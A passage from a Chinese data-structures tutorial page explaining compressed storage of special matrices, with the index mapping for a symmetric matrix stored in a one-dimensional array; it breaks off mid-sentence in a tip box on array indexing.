<li><strong>压缩存储</strong>：指为多个值相同的元素只分配一个存储空间，对零元素不分配存储空间。其目的是节省存储空间</li>
<li><strong>特殊矩阵</strong>：指具有许多相同矩阵元素或零元素，并且这些相同矩阵元素或零元素的分布有一定规律性的矩阵。常见的特殊矩阵有对称矩阵、上（下）三角矩阵、对角矩阵等</li>
<li><strong>特殊矩阵的压缩存储方法</strong>：找出特殊矩阵中值相同的矩阵元素的分布规律，把那些呈现规律性分布的、值相同的多个矩阵元素压缩存储到一个存储空间中</li>
</ul>
<ol>
<li>
<p><strong>对称矩阵</strong></p>
<p>若对一个 <code>n</code> 阶矩阵 <code>A</code> 中的任意一个元素 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>a</mi><mrow><mi>i</mi><mo separator="true">,</mo><mi>j</mi></mrow></msub></mrow><annotation encoding="application/x-tex">a_{i,j}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7167em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mpunct mtight">,</span><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span></span></span></span> 都有 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>a</mi><mrow><mi>i</mi><mo separator="true">,</mo><mi>j</mi></mrow></msub><mo>=</mo><msub><mi>a</mi><mrow><mi>j</mi><mo separator="true">,</mo><mi>i</mi></mrow></msub><mo stretchy="false">(</mo><mn>1</mn><mo>⩽</mo><mi>i</mi><mo separator="true">,</mo><mi>j</mi><mo>⩽</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">a_{i,j} = a_{j,i} (1 \leqslant i, j \leqslant n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7167em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mpunct mtight">,</span><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.0361em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span><span class="mpunct mtight">,</span><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel amsrm">⩽</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.854em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">i</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel amsrm">⩽</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span> 则称其为对称矩阵。其中的元素可以划分为 <code>3</code> 个部分，即上三角区、主对角线和下三角区。</p>
<p>对于 <code>n</code> 阶对称矩阵，上三角区的所有元素和下三角区的对应元素相同，若仍采用二维数组存放，则会浪费几乎一半的空间，为此将 <code>n</code> 阶对称矩阵 <code>A</code> 存放在一维数组 <code>B[n(n+l)/2]</code> 中，即元素 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>a</mi><mrow><mi>i</mi><mo separator="true">,</mo><mi>j</mi></mrow></msub></mrow><annotation encoding="application/x-tex">a_{i,j}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7167em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mpunct mtight">,</span><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span></span></span></span> 存放在 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>b</mi><mi>k</mi></msub></mrow><annotation encoding="application/x-tex">b_{k}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 中。比如只存放下三角部分（含主对角）的元素。</p>
<p>在数组 <code>B</code> 中，位于元素 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>a</mi><mrow><mi>i</mi><mo separator="true">,</mo><mi>j</mi></mrow></msub><mo stretchy="false">(</mo><mi>i</mi><mo>⩾</mo><mi>j</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">a_{i,j} (i \geqslant j)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0361em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mpunct mtight">,</span><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">i</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel amsrm">⩾</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mclose">)</span></span></span></span> 前面的元素个数为：</p>
<ul>
<li>第 1 行：1 个元素（<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>a</mi><mrow><mn>1</mn><mo separator="true">,</mo><mn>1</mn></mrow></msub></mrow><annotation encoding="application/x-tex">a_{1,1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7167em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mpunct mtight">,</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span></span></span></span>）</li>
<li>第 2 行：2 个元素（<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>a</mi><mrow><mn>2</mn><mo separator="true">,</mo><mn>1</mn></mrow></msub><mo separator="true">,</mo><msub><mi>a</mi><mrow><mn>2</mn><mo separator="true">,</mo><mn>2</mn></mrow></msub></mrow><annotation encoding="application/x-tex">a_{2,1}, a_{2,2}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7167em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mpunct mtight">,</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mpunct mtight">,</span><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span></span></span></span>）</li>
<li>……</li>
<li>第 i - 1 行：i - 1 个元素（<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>a</mi><mrow><mi>i</mi><mo>−</mo><mn>1</mn><mo separator="true">,</mo><mn>1</mn></mrow></msub><mo separator="true">,</mo><msub><mi>a</mi><mrow><mi>i</mi><mo>−</mo><mn>1</mn><mo separator="true">,</mo><mn>2</mn></mrow></msub><mo separator="true">,</mo><mo>…</mo><mo separator="true">,</mo><msub><mi>a</mi><mrow><mi>i</mi><mo>−</mo><mn>1</mn><mo separator="true">,</mo><mi>i</mi><mo>−</mo><mn>1</mn></mrow></msub></mrow><annotation encoding="application/x-tex">a_{i-1,1}, a_{i-1,2}, \dotsc ,a_{i-1,i-1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7167em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mbin mtight">−</span><span class="mord mtight">1</span><span class="mpunct mtight">,</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mbin mtight">−</span><span class="mord mtight">1</span><span class="mpunct mtight">,</span><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner">…</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mbin mtight">−</span><span class="mord mtight">1</span><span class="mpunct mtight">,</span><span class="mord mathnormal mtight">i</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span></span></span></span>）</li>
<li>第 i 行：j - 1 个元素（<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>a</mi><mrow><mi>i</mi><mo>−</mo><mn>1</mn><mo separator="true">,</mo><mn>1</mn></mrow></msub><mo separator="true">,</mo><msub><mi>a</mi><mrow><mi>i</mi><mo separator="true">,</mo><mn>2</mn></mrow></msub><mo separator="true">,</mo><mo>…</mo><mo separator="true">,</mo><msub><mi>a</mi><mrow><mi>i</mi><mo separator="true">,</mo><mi>j</mi><mo>−</mo><mn>1</mn></mrow></msub></mrow><annotation encoding="application/x-tex">a_{i-1,1}, a_{i,2}, \dotsc ,a_{i,j-1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7167em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mbin mtight">−</span><span class="mord mtight">1</span><span class="mpunct mtight">,</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mpunct mtight">,</span><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner">…</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mpunct mtight">,</span><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span></span></span></span>）</li>
</ul>
<p>因此，元素 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>a</mi><mrow><mi>i</mi><mo separator="true">,</mo><mi>j</mi></mrow></msub></mrow><annotation encoding="application/x-tex">a_{i,j}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7167em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mpunct mtight">,</span><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span></span></span></span> 在数组 <code>B</code> 中的下标 <code>K = 1 + 2 + … (i - 1) + j - 1 = i(i - 1) / 2 + j - 1</code> （数组下标从 <code>0</code> 开始）。因此，元素下标之间的对应关系如下：</p>
<p class="katex-block"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>k</mi><mo>=</mo><mrow><mo fence="true">{</mo><mtable rowspacing="0.36em" columnalign="left left" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mstyle displaystyle="true" scriptlevel="0"><mfrac><mrow><mi>i</mi><mo stretchy="false">(</mo><mi>i</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><mn>2</mn></mfrac></mstyle><mo>+</mo><mi>j</mi><mo>−</mo><mn>1</mn><mo separator="true">,</mo></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>i</mi><mo>⩾</mo><mi>j</mi><mo stretchy="false">(</mo><mtext>下三角区和主对角线元素</mtext><mo stretchy="false">)</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mstyle displaystyle="true" scriptlevel="0"><mfrac><mrow><mi>j</mi><mo stretchy="false">(</mo><mi>j</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><mn>2</mn></mfrac></mstyle><mo>+</mo><mi>i</mi><mo>−</mo><mn>1</mn><mo separator="true">,</mo></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>i</mi><mo>&lt;</mo><mi>j</mi><mo stretchy="false">(</mo><mtext>上三角区元素</mtext><msub><mi>a</mi><mrow><mi>i</mi><mo separator="true">,</mo><mi>j</mi></mrow></msub><mo>=</mo><msub><mi>a</mi><mrow><mi>j</mi><mo separator="true">,</mo><mi>i</mi></mrow></msub><mo stretchy="false">)</mo></mrow></mstyle></mtd></mtr></mtable></mrow></mrow><annotation encoding="application/x-tex">
k = \begin{cases}
  \dfrac{i(i - 1)}{2} + j - 1, &amp; i \geqslant j(\text{下三角区和主对角线元素}) \\
  \dfrac{j(j - 1)}{2} + i - 1, &amp; i &lt; j(\text{上三角区元素} a_{i,j} = a_{j,i})
\end{cases}
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:4.226em;vertical-align:-1.863em;"></span><span class="minner"><span class="mopen"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.35em;"><span style="top:-2.2em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎩</span></span></span><span style="top:-2.192em;"><span class="pstrut" style="height:3.15em;"></span><span style="height:0.316em;width:0.8889em;"><svg xmlns="http://www.w3.org/2000/svg" width="0.8889em" height="0.316em" style="width:0.8889em" viewBox="0 0 888.89 316" preserveAspectRatio="xMinYMin"><path d="M384 0 H504 V316 H384z M384 0 H504 V316 H384z"></path></svg></span></span><span style="top:-3.15em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎨</span></span></span><span style="top:-4.292em;"><span class="pstrut" style="height:3.15em;"></span><span style="height:0.316em;width:0.8889em;"><svg xmlns="http://www.w3.org/2000/svg" width="0.8889em" height="0.316em" style="width:0.8889em" viewBox="0 0 888.89 316" preserveAspectRatio="xMinYMin"><path d="M384 0 H504 V316 H384z M384 0 H504 V316 H384z"></path></svg></span></span><span style="top:-4.6em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎧</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.85em;"><span></span></span></span></span></span></span><span class="mord"><span class="mtable"><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.363em;"><span style="top:-4.363em;"><span class="pstrut" style="height:3.427em;"></span><span class="mord"><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.427em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">2</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">i</span><span class="mopen">(</span><span class="mord mathnormal">i</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord">1</span><span class="mclose">)</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord">1</span><span class="mpunct">,</span></span></span><span style="top:-2.25em;"><span class="pstrut" style="height:3.427em;"></span><span class="mord"><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.427em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">2</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord">1</span><span class="mclose">)</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord mathnormal">i</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord">1</span><span class="mpunct">,</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.863em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:1em;"></span><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.363em;"><span style="top:-4.363em;"><span class="pstrut" style="height:3.427em;"></span><span class="mord"><span class="mord mathnormal">i</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel amsrm">⩾</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mopen">(</span><span class="mord text"><span class="mord cjk_fallback">下三角区和主对角线元素</span></span><span class="mclose">)</span></span></span><span style="top:-2.25em;"><span class="pstrut" style="height:3.427em;"></span><span class="mord"><span class="mord mathnormal">i</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mopen">(</span><span class="mord text"><span class="mord cjk_fallback">上三角区元素</span></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mpunct mtight">,</span><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span><span class="mpunct mtight">,</span><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.863em;"><span></span></span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></span></p>
<p>当数组下标从 <code>1</code> 开始时，可以采用同样的推导方法。</p>
<div class="hint-container tip">
<p class="hint-container-title">提示</p>
<p>二维数组 <code>A[n][n]</code> 和 <code>A[0…n-l][0…n-1]</code> 的写法是等价的。如果数组写为 <code>A[1…n][1…n]</code>，则说明指定了从下标 <code>1</code> 开始存储元素。二维数组元素写为 <code>a[i][j]</code>，注意数组元素下标 <code>i</code> 和 <code>j</code> 通常是从 <code>0</code> 开始的。矩阵元素通常写为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>a</mi><mrow><mi>i</mi><mo separator="true">,</mo><mi>j</mi></mrow></msub></mrow><annotation encoding="application/x-tex">a_{i,j}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7167em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mpunct mtight">,</span><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span></span></span></span> 或 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>a</mi><mrow><mo stretchy="false">(</mo><mi>i</mi><mo stretchy="false">)</mo><mo stretchy="false">(</mo><mi>j</mi><mo stretchy="false">)</mo></mrow></msub></mrow><annotation encoding="application/x-tex">a_{(i)(j)}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7858em;vertical-align:-0.3552em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3448em;"><span style="top:-2.5198em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">(</span><span class="mord mathnormal mtight">i</span><span class="mclose mtight">)</span><span class="mopen mtight">(</span><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span><span class="mclose mtight">)</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.3552em;"><span></span></span></span></span></span></span></span></span></span>，注意行号 <code>i</code> 和列号 <code>j</code> 是从 